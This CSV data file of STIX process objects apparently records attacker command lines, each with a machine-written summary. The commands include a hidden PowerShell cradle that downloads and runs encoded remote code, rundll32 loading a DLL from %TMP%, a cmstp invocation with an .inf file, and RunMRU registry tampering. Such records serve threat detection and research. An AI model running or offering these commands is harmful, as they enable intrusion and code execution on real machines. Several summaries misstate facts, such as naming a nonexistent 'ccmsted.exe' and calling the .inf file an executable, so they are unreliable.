binary_ref,command_line,description,extensions,id,image,name,type,summary
,"rundll32.exe ""%TMP%\vmtools.dll"",fjdpw03d",,,process--9b97e379-0be6-45d6-93fc-9468a27d636b,,rundll32.exe,process,"The object contains information about a process named 'rundll32.exe'. It was launched by running the command line parameter 'rundll32.exe ""%TMP%\\vmtools.dll"",fjdpw03d' from the rundll32 executable. The description of this process is currently unknown as it is represented by NaN (Not a Number)."
,bitsadmin.exe /create test,,,process--3690b561-4abf-4dd4-973d-ff8e1969f5f5,,bitsadmin.exe,process,"The object contains a process named 'bitsadmin.exe' which was created using the command line instruction 'bitsadmin.exe /create test'. The specific details of this process are somewhat limited due to missing metadata. For example, there is no information available on when this process was created or any relevant extensions associated with it."
,"cmd.exe /c copy c:\Windows\System32\bitsadmin.exe ""%TMP%\bypass.exe""",,,process--d81f0b50-ed32-41ae-9b3a-78af5b41d2eb,,cmd.exe,process,"The object contains a process named cmd.exe, which was executed using the binary_ref, but this value is not available. Instead, a command line script was used to copy the bitsadmin.exe file from c:\\Windows\\System32 to a temporary location %TMP% and rename it to bypass.exe.

The process details are as follows:

* The process name is cmd.exe.
* It is of type process.
* A command line script was used to execute this process, which included copying the bitsadmin.exe file from its original location and renaming it to bypass.exe.
* No additional information such as image or description is available for this process."
,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" /v a /t REG_SZ /d ""powershell"" /f",,,process--8898645f-f447-4d76-b1a2-71df1dacac14,,reg.exe,process,"The object contains information about a Windows process named reg.exe. The process is associated with the command line argument that adds a string value to the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU, setting it to the string ""powershell"". This suggests that when reg.exe is executed, it modifies the RunMRU key to run PowerShell."
,reg.exe delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f,,,process--9a063518-363c-4bb8-91b1-2ca9b2220a33,,reg.exe,process,The object contains information about a process named reg.exe. The process type is specified as 'process'. No further details are available due to missing or unavailable data in the provided metadata.
,"powershell.exe -NoP -sta -NonI -W hidden -c ""$e=(New-Object System.Net.webClient).downloadString('%remotefile-66%');powershell -enc $e""",,,process--bb7c10b6-ee0a-4b33-8a3f-a8f4369969bd,,powershell.exe,process,"The object contains information about a process named 'powershell.exe'. The process is associated with the command line parameters that were used to run it. 

The key characteristics of this process include:

- It uses powershell.exe as its executable.
- The command line used to start it includes options such as -NoP, -sta, and -NonI, which likely control various aspects of the PowerShell behavior.
- A script within the command line is executed remotely using a web client.
- Other metadata fields are missing or not available."
,"powershell.exe -c ""Invoke-WebRequest -Uri %remotefile-11085%""",,,process--8ee4580e-29b2-4db0-a73f-fe790e49c9eb,,powershell.exe,process,"The object contains a process named 'powershell.exe' that was executed through the command line. The specific command used to run this process is 'powershell.exe -c ""Invoke-WebRequest -Uri %remotefile-11085%"""". This command attempts to execute an Invoke-WebRequest operation using the 'powershell.exe' interpreter, with a specified remote file URL as an argument."
,"powershell.exe -c ""%TMP%\scheduledTask.ps1""",,,process--c2387fa4-4818-4317-a80f-cc72f3ca9876,,powershell.exe,process,"The object contains information about a scheduled task in PowerShell. The task is associated with the 'powershell.exe' process, which indicates that it was created or managed using this specific executable. 

A command line instruction has been defined to execute the task: 'powershell.exe -c ""%TMP%\\scheduledTask.ps1""', where %TMP% represents the environment variable for the temporary directory and scheduledTask.ps1 is a script located in this directory.

The object does not specify a description or an image associated with it."
,cmstp.exe /s c:\programdata\DefenderService.inf,,,process--5c9238a9-9c18-42e6-8139-16a0b31c965c,,cmstp.exe,process,"The object contains a process named cmstp.exe that is associated with the binary reference c:\\programdata\\DefenderService.inf. This process is a standalone executable file with the extension .exe. The command-line instruction to run this process is provided by the ccmsted.exe tool, which is executed with the ""/s"" option followed by the full path of the DefenderService.inf file located at c:\\programdata. The type of this process object indicates that it is a process, further confirming its standalone nature as an executable file."
,%TMP%\GetBrowserList.exe,,,process--534367db-6e0c-454a-a994-a7568064f023,,GetBrowserList.exe,process,"The object contains a process with the name ""GetBrowserList.exe"". The command used to launch this process is specified in the command line field. In this case, it is %TMP%\\GetBrowserList.exe.

This process seems to be related to browsing or displaying information about web browsers, as indicated by its name and function. However, no additional details such as extensions, image information, or description are available for this process.

It's worth noting that the binary reference field contains NaN (Not a Number), indicating that there may not be reliable information available about the actual file location of the process or executable."
